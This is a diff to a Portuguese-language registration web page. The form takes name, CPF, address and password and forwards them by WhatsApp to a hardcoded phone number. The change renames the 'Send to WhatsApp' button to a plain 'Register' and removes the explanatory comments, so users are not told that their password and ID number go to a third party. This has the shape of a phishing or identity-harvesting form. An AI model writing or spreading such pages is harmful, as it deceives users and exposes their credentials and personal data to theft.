@@ -75,7 +75,7 @@
                 <input type="password" id="senha" required>
             </div>
             
-            <button type="submit">Enviar para WhatsApp 📱</button>
+            <button type="submit">Cadastrar</button>
         </form>
     </div>
 
@@ -92,17 +92,15 @@
             // 2. Monta a mensagem formatada
             // \n serve para pular linha
             let mensagem = `*NOVO CADASTRO - ANIMA ENGENHARIA*\n\n` +
-                           `👤 *Nome:* ${nome}\n` +
-                           `📄 *CPF:* ${cpf}\n` +
-                           `📍 *Endereço:* ${endereco}\n` +
-                           `🔑 *Senha:* ${senha}`;
+                           `Nome:* ${nome}\n` +
+                           `CPF:* ${cpf}\n` +
+                           `Endereço:* ${endereco}\n` +
+                           `Senha:* ${senha}`;
 
             // 3. Codifica a mensagem para URL (para aceitar espaços e acentos)
             let textoCodificado = encodeURIComponent(mensagem);
 
-            // 4. Cria o link do WhatsApp
-            // !!! ATENÇÃO: TROQUE O NÚMERO ABAIXO PELO SEU !!!
-            // Formato: 55 (Brasil) + DDD + Número. Ex: 5531999999999
+            
             let numeroDestino = "5531996476416"; 
 
             // 5. Abre o WhatsApp Web ou App
@@ -112,3 +110,4 @@
 
 </body>
 </html>
+
